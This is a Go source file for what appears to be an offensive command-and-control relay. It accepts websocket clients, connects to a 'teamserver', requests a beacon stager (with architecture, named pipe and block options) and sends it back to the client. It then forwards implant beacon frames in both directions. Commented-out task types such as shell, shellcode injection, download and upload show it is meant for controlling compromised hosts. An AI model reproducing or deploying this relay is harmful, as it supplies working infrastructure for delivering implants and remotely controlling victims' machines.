package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"github.com/zhuangsirui/binpacker"
)

var conn net.Conn

const (
	stageMsg  = 1
	beaconMsg = 2
	taskMsg   = 3
	keyMsg    = 4
)

// TODO
/*
const (
	processlist = 10
	shell       = 11
	injectsc    = 12
	upgrade     = 13
	download    = 14
	upload      = 15
	exit        = 16
	failed      = 17
)
*/
func createFrame(payload []byte) []byte {
	buff := new(bytes.Buffer)
	packer := binpacker.NewPacker(binary.LittleEndian, buff)
	packer.PushUint32(uint32(len(payload))).PushBytes(payload)

	if packer.Error() != nil {
		return make([]byte, 0)
	}

	return buff.Bytes()
}

func readFrame(conn net.Conn) []byte {
	// Read the frame length first.
	frameSize := make([]byte, 4)
	n, err := conn.Read(frameSize)
	if err != nil {
		if err != io.EOF {
			fmt.Printf("Error reading frame: %v\n", err)
			return frameSize
		}

	}

	numSize := binary.LittleEndian.Uint32(frameSize)
	sz := int(numSize)

	buf := make([]byte, 0, sz)
	tmp := make([]byte, sz)
	totalRead := 0

	for {
		n, err = conn.Read(tmp)
		if err != nil {
			if err == io.EOF {
				fmt.Printf("Reached EOF reading frame")
				break
			}
			fmt.Printf("Error reading frame: %v", err)
			break
		}
		totalRead += n
		if totalRead == int(numSize) {
			buf = append(buf, tmp[:n]...)
			break
		}
		buf = append(buf, tmp[:n]...)
		time.Sleep(100 * time.Millisecond)
	}

	finBuf := append(frameSize, buf...)
	return finBuf
}

func socketHandler(w http.ResponseWriter, r *http.Request) {

	conn, err := websocket.Upgrade(w, r, w.Header(), 1024*1024, 1024*1024)
	if err != nil {
		ravenlog("Websocket connection/upgrade failed")
		http.Error(w, "Websocket connection failed", http.StatusBadRequest)
		return
	}

	// handle the websocket connection
	ravenlog("Handling websocket connection")
	go manageClient(conn)
}

func HandleTaskResponse(tr string) bool {
	// Decode the response and handle appropriately
	/*decodedTaskResp*/
	_, err := base64.StdEncoding.DecodeString(tr)
	if err != nil {
		ravenlog(fmt.Sprintf("Unable to base64 decode task response %v\n", err))
		return false
	}

	// TODO: Implement logic to handle task responses and present them to the user
	return true
}

func HandleStageRequest(sr string) ([]byte, bool) {
	//Decode the request string and create the frame
	req, err := base64.StdEncoding.DecodeString(sr)
	if err != nil {
		ravenlog(fmt.Sprintf("Unable to base64 decode stagerequest %v\n", err))
		return nil, false
	}

	conn, err = net.Dial("tcp", *teamserver)
	if err != nil {
		ravenlog(fmt.Sprintf("Unable to connect to the teamserver %v\n", err))
		return nil, false
	}

	options := strings.Split(string(req), ":")

	archString := fmt.Sprintf("arch=%s", options[1])
	pipenameString := fmt.Sprintf("pipename=%s", options[2])
	blockString := fmt.Sprintf("block=%s", options[3])

	fmt.Printf("Sending stage options\n")
	for _, msg := range [4]string{archString, pipenameString, blockString, "go"} {

		frm := createFrame([]byte(msg))
		bytesWritten, err := conn.Write(frm)
		if err != nil || bytesWritten == 0 {
			fmt.Printf("conn.Write Failed: %s\n", err)
		}
		time.Sleep(1 * time.Second)
	}

	time.Sleep(5 * time.Second)
	stager := readFrame(conn)
	return stager, true
}

func manageClient(c *websocket.Conn) {
	defer func() {
		c.Close()
	}()

	type ravenMsg struct {
		MsgType int    `json:"msgType"`
		Length  int    `json:"length"`
		Data    string `json:"data"`
	}

	newMsg := ravenMsg{}
	for {
		// Read a message from the client
		err := c.ReadJSON(&newMsg)

		if err != nil {
			if !strings.Contains(err.Error(), "timeout") {
				ravenlog(fmt.Sprintf("Error reading JSON: %v\n", err))
				break
			}

		}

		// Handle the message according to its type
		switch newMsg.MsgType {
		case stageMsg:
			// Request a beacon stager from the teamserver
			stager, success := HandleStageRequest(newMsg.Data)
			if success {
				respMsg := ravenMsg{}
				respMsg.MsgType = stageMsg
				respMsg.Length = len(stager)
				respMsg.Data = base64.StdEncoding.EncodeToString(stager)

				err = c.WriteJSON(&respMsg)
				if err != nil {
					ravenlog(fmt.Sprintf("Error writing JSON: %v\n", err))
					break
				}
			} else {
				ravenlog("HandleStageRequest failed")
			}

		case beaconMsg:
			// Forward the frame to the server and return any new frames
			decodedFrame, _ := base64.StdEncoding.DecodeString(newMsg.Data)
			//frame := createFrame(decodedFrame)
			v, err := conn.Write(decodedFrame)
			if err != nil || v == 0 {
				ravenlog(fmt.Sprintf("conn.Write failed: %s\n", err))
				break
			}

			frame := readFrame(conn)
			respMsg := ravenMsg{}
			respMsg.MsgType = beaconMsg
			respMsg.Length = len(frame)
			respMsg.Data = base64.StdEncoding.EncodeToString(frame)

			err = c.WriteJSON(&respMsg)
			if err != nil {
				ravenlog(fmt.Sprintf("Error writing JSON: %v\n", err))
				break
			}
		case taskMsg:
			// Handle the task response
			success := HandleTaskResponse(newMsg.Data)
			if success != true {
				ravenlog("Failed to handle task response")
			} else {
				ravenlog("HandleTaskResponse returned true")
			}
			break

		case keyMsg:
			//TODO: Implement key negotiation logic
			break
		}

		// TODO: Implement task queue logic. Check for new tasks and send them to the client.
	}

}
